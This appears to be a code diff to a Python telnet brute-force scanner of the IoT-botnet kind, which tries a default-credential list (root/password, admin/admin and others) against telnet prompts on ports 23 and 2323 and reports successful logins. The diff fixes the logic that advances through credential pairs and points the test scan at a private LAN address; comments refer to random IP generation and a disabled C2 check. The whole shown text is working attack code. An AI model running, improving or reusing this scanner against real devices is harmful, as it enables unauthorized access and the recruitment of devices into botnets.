@@ -13,8 +13,9 @@ from colorama import init, Fore
 
 
 
-MAlist = [("root", "password"),
+MAlist = [
         ("admin", "password"),
+        ("root", "password"),
         ("admin", "admin"),
         ("root", "admin"),
         ("root", "888888"),
@@ -129,6 +130,7 @@ def bruteport(ip, port):    #try 23 & 2323
     tn = None
     need_user = False
     pindex = 0
+    check_around=0
     while True:
         try:
             user = ""
@@ -141,13 +143,14 @@ def bruteport(ip, port):    #try 23 & 2323
                 print(f"[Scanner] Connection established to found ip {ip}" ) # can connect this ip and port
             while True:
                 response = tn.read_until(b":", 1)                           # Wait until you can see: Appears to indicate that you can try to log in
-                # print("Response: " + str(response))
+                #print("Response: " + str(response))
                 if "Login:" in str(response) or "Username:" in str(response)or "login:" in str(response):  # if login or username exist in response
                     print("[Scanner] Received username prompt")
                     need_user = True                                        # If retrying to log in requires entering an account  then set True
                     asked_password_in_cnx = False                           # Did you ask for a password ?
                     user, password = get_credentials(pindex)                # generate pair of account and password
                     tn.write((user + "\n").encode('ascii'))                 # send username to login account 
+                    check_around+=1
                 elif "Password:" in str(response) or "password" in str(response):    
                     if asked_password_in_cnx and need_user:                 # if ask password before and need account then close connect 
                         tn.close()
@@ -160,6 +163,7 @@ def bruteport(ip, port):    #try 23 & 2323
                         sys.exit(0)
                     print("[Scanner] Received password prompt")
                     tn.write((password + "\n").encode('ascii'))
+                    check_around+=1
                 if ">" in str(response) or "$" in str(response) or "#" in str(response) or "%" in str(response):
                     # broken
                     print("[Scanner] Brutefoce succeeded %s " % ip + ' : '.join((user, password)))
@@ -168,7 +172,9 @@ def bruteport(ip, port):    #try 23 & 2323
                         print("The target's username and password :\n",user+"\t",password)
                     pindex = 0
                     return True 
-                pindex += 1
+                if check_around==2:
+                    pindex += 1
+                    check_around=0
         except EOFError as e:
             tn = None
             need_user = False
@@ -275,16 +281,16 @@ def Scanner(choose):
             is_telent_open(generate_IP(i))
     else:
         print("Try to scan Telnet ---------------")
-        is_telent_open("192.168.1.167")
-        print("Try to scan SSH ---------------")
-        is_ssh_open("192.168.1.167")
+        is_telent_open("192.168.1.121")
+        #print("Try to scan SSH ---------------")
+        #is_ssh_open("192.168.1.167")
 
 
 
 if __name__ == '__main__':
     print("[Scanner] Scanner process started ..")
     #validateC2() # Test to connect remote DB
-    Scanner(1)
+    Scanner(2)
 
 
 '''
